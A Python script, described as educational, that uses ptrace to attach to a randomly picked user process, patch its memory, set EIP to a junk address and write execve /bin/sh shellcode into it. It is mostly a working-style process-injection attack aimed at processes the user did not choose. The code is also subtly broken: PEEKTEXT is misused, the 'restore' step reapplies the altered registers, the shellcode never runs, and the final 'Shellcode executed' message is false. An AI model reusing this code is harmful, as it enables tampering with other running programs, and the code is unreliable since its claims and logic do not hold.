"""
This script is used to attach to a process, modify its memory and registers, and optionally execute shellcode using the ptrace system call.

The script provides functionality to:
1. Attach to a process by its PID.
2. Peek into the memory of the attached process.
3. Poke new values into the process memory.
4. Retrieve and modify the general-purpose registers of the process.
5. Write and execute shellcode within the context of the attached process.
6. Restore the original state and detach from the process.

It is primarily designed for educational purposes to demonstrate how process memory and registers can be manipulated using ptrace in Linux.
"""

import ctypes
import struct
import sys
import os
import random

libc = ctypes.CDLL('libc.so.6')

PTRACE_ATTACH = 16
PTRACE_DETACH = 17
PTRACE_PEEKTEXT = 3
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13

def attach_process(pid):
    return libc.ptrace(PTRACE_ATTACH, pid, 0, 0)

def detach_process(pid):
    return libc.ptrace(PTRACE_DETACH, pid, 0, 0)

def peek_text(pid, addr):
    word = ctypes.c_uint32()
    libc.ptrace(PTRACE_PEEKTEXT, pid, addr, ctypes.byref(word))
    return word.value

def poke_text(pid, addr, word):
    libc.ptrace(PTRACE_POKETEXT, pid, addr, word)

def get_regs(pid):
    class regs_struct(ctypes.Structure):
        _fields_ = [('eax', ctypes.c_uint32), ('ecx', ctypes.c_uint32), ('edx', ctypes.c_uint32),
                    ('ebx', ctypes.c_uint32), ('esp', ctypes.c_uint32), ('ebp', ctypes.c_uint32),
                    ('esi', ctypes.c_uint32), ('edi', ctypes.c_uint32), ('eip', ctypes.c_uint32),
                    ('eflags', ctypes.c_uint32), ('cs', ctypes.c_uint32), ('ss', ctypes.c_uint32),
                    ('ds', ctypes.c_uint32), ('es', ctypes.c_uint32), ('fs', ctypes.c_uint32),
                    ('gs', ctypes.c_uint32)]

    regs = regs_struct()
    libc.ptrace(PTRACE_GETREGS, pid, 0, ctypes.byref(regs))
    return regs

def set_regs(pid, regs):
    # Pack the fields in the correct order according to the regs_struct
    regs_packed = struct.pack('16I', regs.eax, regs.ecx, regs.edx, regs.ebx, regs.esp, regs.ebp,
                              regs.esi, regs.edi, regs.eip, regs.eflags, regs.cs, regs.ss,
                              regs.ds, regs.es, regs.fs, regs.gs)
    libc.ptrace(PTRACE_SETREGS, pid, 0, ctypes.byref(ctypes.create_string_buffer(regs_packed)))

def pick_user_process():
    """
    Pick a random user process, excluding system processes and SSH processes.
    Returns:
        int: The PID of the randomly selected user process.
    """
    user_uid = os.getuid()
    processes = []

    for proc in os.listdir('/proc'):
        if proc.isdigit():
            try:
                with open(f'/proc/{proc}/status', 'r') as f:
                    lines = f.readlines()
                    uid_line = [line for line in lines if line.startswith('Uid:')][0]
                    uid = int(uid_line.split()[1])
                    if uid == user_uid:
                        with open(f'/proc/{proc}/cmdline', 'r') as cmd_file:
                            cmdline = cmd_file.read()
                            if 'ssh' not in cmdline:
                                processes.append(int(proc))
            except (FileNotFoundError, IndexError, PermissionError):
                continue

    if not processes:
        raise Exception("No suitable user processes found.")

    return random.choice(processes)

def process_access():
    # Pick a random user process PID, excluding SSH processes
    pid = pick_user_process()
    print(f"Selected PID: {pid}")

    # Attach to the process
    attach_process(pid)

    # Read the process' memory
    addr = 0x10000000
    word = peek_text(pid, addr)
    print(f"Original word at 0x{addr:08x}: 0x{word:08x}")

    # Patch the process' memory
    new_word = 0xDEADBEEF
    poke_text(pid, addr, new_word)
    print(f"Patched word at 0x{addr:08x}: 0x{peek_text(pid, addr):08x}")

    # Get the thread's registers
    regs = get_regs(pid)
    print(f"Original registers: {regs}")

    # Modify the thread's registers
    regs.eip = 0x12345678  # Modify the EIP register
    set_regs(pid, regs)
    print(f"Modified registers: {get_regs(pid)}")

    # Run the shellcode
    shellcode = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80'
    for i in range(0, len(shellcode), 4):
        chunk = shellcode[i:i+4]
        chunk = chunk.ljust(4, b'\x00')  # Ensure the chunk is 4 bytes
        poke_text(pid, addr + i, int.from_bytes(chunk, 'little'))

    set_regs(pid, regs)  # Restore the original registers

    # Detach from the process
    detach_process(pid)

    print("Shellcode executed. Check the process' output.")
